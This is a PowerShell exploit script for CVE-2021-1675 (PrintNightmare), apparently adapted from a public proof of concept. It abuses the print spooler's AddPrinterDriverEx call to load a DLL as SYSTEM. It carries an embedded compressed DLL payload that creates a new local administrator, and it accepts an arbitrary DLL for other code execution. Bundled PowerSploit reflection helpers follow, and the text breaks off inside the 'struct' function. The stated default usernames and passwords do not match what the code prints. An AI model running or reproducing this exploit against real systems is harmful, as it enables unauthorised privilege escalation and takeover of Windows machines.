function Invoke-getadminuser
{
    <#
        .SYNOPSIS
        Exploits CVE-2021-1675 (Printgetadminuser)

        Authors:
            Caleb Stewart - https://github.com/calebstewart
            John Hammond - https://github.com/JohnHammond
        URL: https://github.com/calebstewart/CVE-2021-1675

        .DESCRIPTION
        Exploits CVE-2021-1675 (Printgetadminuser) locally to add a new local administrator
        user with a known password. Optionally, this can be used to execute your own
        custom DLL to execute any other code as NT AUTHORITY\SYSTEM.

        .PARAMETER DriverName
        The name of the new printer driver to add (default: "Totally Not Malicious")

        .PARAMETER NewUser
        The name of the new user to create when using the default DLL (default: "adm1n")

        .PARAMETER NewPassword
        The password for the new user when using the default DLL (default: "P@ssw0rd")

        .PARAMETER DLL
        The DLL to execute when loading the printer driver (default: a builtin payload which
        creates the specified user, and adds the new user to the local administrators group).

        .EXAMPLE
        > Invoke-getadminuser
        Adds a new local user named `adm1n` which is a member of the local admins group

        .EXAMPLE
        > Invoke-getadminuser -NewUser "caleb" -NewPassword "password" -DriverName "driver"
        Adds a new local user named `caleb` using a printer driver named `driver`

        .EXAMPLE
        > Invoke-getadminuser -DLL C:\path\to\

    #>
    param (
        [string]$DriverName = "Totally Not Malicious",
        [string]$NewUser = "",
        [string]$NewPassword = "",
        [string]$DLL = ""
    )

    if ( $DLL -eq "" ){
        $getadminuser_data = [byte[]](get_getadminuser_dll)
        $encoder = New-Object System.Text.UnicodeEncoding

        if ( $NewUser -ne "" ) {
            $NewUserBytes = $encoder.GetBytes($NewUser)
            [System.Buffer]::BlockCopy($NewUserBytes, 0, $getadminuser_data, 0x32e20, $NewUserBytes.Length)
            $getadminuser_data[0x32e20+$NewUserBytes.Length] = 0
            $getadminuser_data[0x32e20+$NewUserBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new user: dave2"
        }

        if ( $NewPassword -ne "" ) {
            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $getadminuser_data, 0x32c20, $NewPasswordBytes.Length)
            $getadminuser_data[0x32c20+$NewPasswordBytes.Length] = 0
            $getadminuser_data[0x32c20+$NewPasswordBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new password: password123!"
        }

        $DLL = [System.IO.Path]::GetTempPath() + "getadminuser.dll"
        [System.IO.File]::WriteAllBytes($DLL, $getadminuser_data)
        Write-Host "[+] created payload at $DLL"
        $delete_me = $true
    } else {
        Write-Host "[+] using user-supplied payload at $DLL"
        Write-Host "[!] ignoring NewUser and NewPassword arguments"
        $delete_me = $false
    }

    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"

    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'

    # Define custom structures for types created
    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }

    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004

    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should fail!"
        return
    }

    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] failed to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)

    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName

    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)

    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] added user $NewUser as local administrator"
        } else {
            Write-Host "[+] driver appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDriverEx failed"
    }

    if ( $delete_me ) {
        Write-Host "[+] deleting payload from $DLL"
        Remove-Item -Force $DLL
    }
}

function get_getadminuser_dll
{
    $getadminuser_data = [System.Convert]::FromBase64String("H4sIAAAAAAAEAO0YW2wc1fXM7MO769jZ8drO2nHsJQlh81o/1o8YguN92MmCX3idxAmJnNnd6/UkszObmVk7BhUSWij5IG1oiABBFECE9AFFNBIhLaWqSlsKUaNAW4lSFal88BEpJVWpSvPouXfG9saJBD/9qbj2nHve99xzz713dvq3fxdsAGDH59o1gNNgtm748rYfn/KGM+Vwyn32ltNc39lbRiYkPZDX1Kwm5gJpUVFUI5AiAa2gBCQlEB9MBnJqhoTKyjzLLR9DPQB9nA08W96bmPH7MSwNlHJNABVIOE3ea40IArOBeRnOm3EDzPUsKN5EbdD9MFWl/3P9bMfaLvQ7aE34JH+TSe4CWPAVcnFDw/hcRaQL6U1FdMgg+wzsP/Waumyu88ZH9q6QpmtpsGLDGNlEK6/XQ3Z3SCOymrZi3WX58t+gF50f5pFGs9/ETBzw26UAT6IT7itN8sa2lA/iinlgVZeF8LZvoC/7KpT5mjzQyzPfAgRLUOoJnC4FCLroMjOGz1/hd1La46upqAm6ESktWWa6tndftftqhdo1TljHoxsN/eSDHjpIBX+1CkfjK2xXq9ANX6l1oOwB9O1hoLqWdZUVqBHEcnf67BWOq1U4Dl/tc7rvr0LvvhKhpLrCEcTJe+q2VziDmGnnCsFxfy0Kg2XIbfDuHg2W09hcTOuxhTgXn5u59nmEEsEluAX3IanCE3QwW3d1EFU8pk1pgK6JabMAlUuFBcKCIuUFDeuDXqpYJpQ1BEd95SgvNzkLhYWKUMpisALwmtkSbpY/Qbg+gb6K6zK4WFhMM/gLuC6D2hSiPl9gNWfFeOs5uruCAnVQWe2rW70YhEqhjj6Ha7cF8KiAsfPPgFC3aNRXR/mHJHS+RFiy9k+CT62gZlWUaU64utpXvzoAQrVQjx7qDws+RKp2qj7UE6mbenRTT4XMTYPQsPa8UH1I8i3CTHnRbBHmyUnz5L6/msZVQvFVWG2VrNogmrwryllVS/fAZGuoKRRuCjd3Uo4DZIR5XNFlDwB8hP2nmPRlSUOTlKxONX6FWXgU+2Wbk9BXap4RyzZuTsSx34H0enS9LCqrKavOaRlvfYJvddN99gUXhmpzz9CtiUmHeqBxASy2eBTnrIeaOIto+pjn16e8OQMn7OK9difsZ3A5/xfbQmii9QifcZRzhHfZnNDpoHABw5MMP8VRuNBG4R8Y/jiDf2ScY0zzDYa/a6d+XmJWDzKdd1BKx36WRcByyXnhr9whe80stQnjoRSPD2bI9m3brYjb2BROoBWlSqGUq4B/INWMklIoo14YVWVRbzOqBqkqtHuQUQ1IrYCNtschzK2BJ3CmJdzjNA/cNoQnbBQ+zfBrQPk2Jn2Bp/CHDP7YTuGbDK5jnEcYftjxFMJKoDAA1IPhoPABBn/NPF+xU3g381/PPPsY5Jh+gGkuZXiOwT1MM4lwKECz9Yj/nI1pz1IztbgfDgcu2p8popyOV3CuM9TLjjPWfbQfjgbeQqpqVtbFvQ21s9Rx2++wmmQ2wlGI2n4PdfDzpXOj17FVe56j9fUmR2+/lJ3W1aCd1v8GVj2TCEtg3EHvpvMODivVsPFYm2NsCa/Yqe2Hdmo7aKO2fhu1XV4kXe2g6/0qk/6SpzfGKq5YCrPSnzHpamZ7N9Ph7G6gmRGAxluD0AMrGR5B6MUqoPg9cNARR3iXI4G5/rttCCR4lxuBvfAQrtVe+Am/A+F2xy4GCRyAKdiNsBTpg/CsYx88B+f4/QhftH8LEsznbXi9NnEh1HkfQuCDjxAuhv9ADJaBnYthBuxcmuFpC18Nbu4FxuGAnolu3OB/5j/no1wJXLTT9LrBibno5krhZcxkN1cGb7F+IXRxdLoCHMe5nm6kebHvn39PFriidxZsB8HDmTvfjitkx/Wx45gOUzhMdKJNkkwzjKibE4oRboF0aobZAnJ+Dl8X7m2PN/VGok0tLZ2xnmgk0hprbYo1tcZj4bb23nUdvR3xpkhLW3N8XUdzuDcaCUdi4XWx1ubWSHPTupbw7FhhHAuHam+FsbGkIRpSOqJp4nRCkYyR6TxJSveRO1s6O2F9v5opyKQL1g9p0qRokEQuL5McUaiNqsSJIUqy3gVDw4OxnmRyLBpJJmJjiYHeweH+yEhicGBWUsxLjkSGRzYPURZkpkbx2YZThpyeVjVZSiE9MqERMZPIIDqkqWmi64jL+YFCLkW0wfHotEH0YdSgEyrkiKkOE1bfr2pkZqZF+YPNirS3QIakDAxtimQmRSVNYLigGFKO9EpEzmwSlYxMIKYquoq9nB+RDNZH8nlZSrMpD4g5AnHMxAhaoSim5nJo1icpBLZqkkEYtkWUC4RmEnow4kyGZCIGXkepgkHd5/KSTLSNRCEaOioSzWKbdTFL5vhxkipks2JKLuJlpnolWZ6jh8l4UhwnxvQwLpg+fzgW+zCRxX0MK5JbCaBqKEpJsmRMz0lppuka0Yqg68T6LDHGGKJYbNaZ9y0T9hEla0zAHqIpRA63hDKyPJdyRikGQpNv/qCA5LRukBzQtCbzokL56YQyrqIv0AiugzK/AGi6DWT3i5ICW4im48Qgb5lpOTZRtJkpoOuYWPSaUchTJmwnmgqbVFlWp8aiok7aW8diItFFbWx0cHgsKROSR4s40fcYKsWihfFxokFUMrBSJolmIDGRNDI9mqZqEEobCHFzDRmaNalQXBKziqrjNtNZfkZUQ5STJK0qGR3T148LKekWaZlYyxKaqZYklrCE87BqATONWxPJVEKZIJgIs3Z1WrRsE8wuoT6XgiJeZiqGWjQZvbKYpbTZ90tpTdXVcQMHzpCIIsrTumQGHZsQNao4GlMxthlqWxFlxbyJyHlcjflLEZNFXQc2LLECgokZZPvUPQWiTRepz0iGSCqSyWgUxdTj8sxQs7MZETWMDzNXSBmamDZgMLWbYKfmx3r20Y0rGWjao0xKmqrQs4utVkLJF0xssGBQlM5xQJ2CqeSEOrVVUjKI0wNREmUsb3Y+Aj1zrMD6SU7Vps09fz0LD4WCpuE4cUkjtBqm2Tnfdi/eOzvxLSWJ76sE//J49ymQRc44qKBhr2OfQ4mBEtrfArAhBrfDDtjKdDMon0KtHehjGnsDdXIQhhbk6DAJaZhADcoPoWQfPlCmI0yjd+qVNuHAuQ/ei7R1v3ZqzcDt9550gz3A4StiADgHIoLA4JK1JQFhZZngF+p4IeD2+5c46ON2u/3ILl/icOG/sFJYy/Mu/MO7TljpDHDCWmEleiqzA8eV8076guFC3ONH4Pc4gfegGXZu7EqA5yoSQj/quzAEm8v1+n07ttS0fnyQd+Ibq7CcdzoF8PDl5X4/7/aXewW/V6grBYfL7/JiTF63Bxw8jcrlpf7dFHBu+kbi4qxf5/X0RW2Er96qifkBVenZlyZ5Wlu4RdQpneqVsHuZXvmwgmPv7jwalEXoYdBfkA0JrztkuK1dhpcIGpXO3OuPNs7d8c/PfMO4STvSWEyNxVQtLsvs2GJ3HjHPRNqu3Yo+vN9r/uTpp46/LmUngyvbO9tu6+ju/amn69KqRc0Xlh/ovnzHxq5Lntua8++Eo9HRV7pGT/9tp7Niz46twRNvyZ2TJx9+4Y7OFaiZsLXtbJx6w/avz7KTUvcX319c0zz9UueFrgOtl1du3DBx8khH4+FXOy9vvtg1ccLyY3kYO1p5MLY7vH1v28Dp2lciqH836tcELzzUjPg3EW+/tOcqegtu6IiEQrEVoWBze6zxn4+Ntt9x/GikMxRrvHL/c8Fjxw+v7z47gaPvm5KyXReuTCIePN97yfvvYy++99SHH3R0nv3NF+9f/s4Pmj85c0/f9JLc588/6cl81HmfJ+DLNga5l4+daUuvCXqF2vIS+52tC2vttQtG4nfWB6o8TlelaG9YLN084V+3mzT2q45+Nto/n0/Lv+kmfNrot6PRboC+ou9XfXwrwi14Co0h7IFhxBIwCANIJxD2ml/d8Pfaxas3+9q0werpO/L8z3JxNvIWEPHM6sVTj56VCTz76BlJ23JmNYJSEbl4KWBPz0sVKbO9av8R+0WSRL5mnbE3enqU6TTN/rVCiuYA1rDfvzP6cXx0dn5KeF4XjxNgOXMV6W7BR0PtOZ0mPIfnHoD1UI76NAaD6SoYu4z5EtlpDzCE2Y7gKT/J5pZGXggpmX3fCLK4+pCXZVYxHCWPtwCNLIvnvmHFFGdjDFp8yRpjJkblK43VyuY1hD5U5BVQatwwu/lzW8dsIqihs1sphZ6mMaIvs/u6/Q9bwPxedmrDlyl+3f4f238B7E7bjAAaAAA=
")

    $getadminuser_ms = New-Object System.IO.MemoryStream -ArgumentList @(,$getadminuser_data)
    $ms = New-Object System.IO.MemoryStream
    $gzs = New-Object System.IO.Compression.GZipStream -ArgumentList @($getadminuser_ms, [System.IO.Compression.CompressionMode]::Decompress)
    $gzs.CopyTo($ms)
    $gzs.Close()
    $getadminuser_ms.Close()

    return $ms.ToArray()
}

########################################################
# Stolen from PowerSploit: https://github.com/PowerShellMafia/PowerSploit
########################################################

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS
Creates an in-memory assembly and module
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER ModuleName
Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
<#
.SYNOPSIS
Creates a .NET type for an unmanaged Win32 function.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
.DESCRIPTION
Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).
The 'func' helper function can be used to reduce typing when defining
multiple function definitions.
.PARAMETER DllName
The name of the DLL.
.PARAMETER FunctionName
The name of the target function.
.PARAMETER EntryPoint
The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.
.PARAMETER ReturnType
The return type of the function.
.PARAMETER ParameterTypes
The function parameters.
.PARAMETER NativeCallingConvention
Specifies the native calling convention of the function. Defaults to
stdcall.
.PARAMETER Charset
If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.
.PARAMETER SetLastError
Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.
.PARAMETER Module
The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER Namespace
An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
.NOTES
Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS
Creates an in-memory enumeration for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.
.PARAMETER Module
The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the enum.
.PARAMETER Type
The type of each enum element.
.PARAMETER EnumElements
A hashtable of enum elements.
.PARAMETER Bitfield
Specifies that the enum should be treated as a bitfield.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS
Creates an in-memory struct for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
.DESCRIPTION
The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.
One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.
.PARAMETER Module
The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the struct.
.PARAMETER StructFields
A hashtable of fields. Use the 'field' helper function to ease
defining each field.
.PARAMETER PackingSize
Specifies the memory alignment of fields.
.PARAMETER ExplicitLayout
Indicates that an explicit offset for each field will be specified.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}
$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}
# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
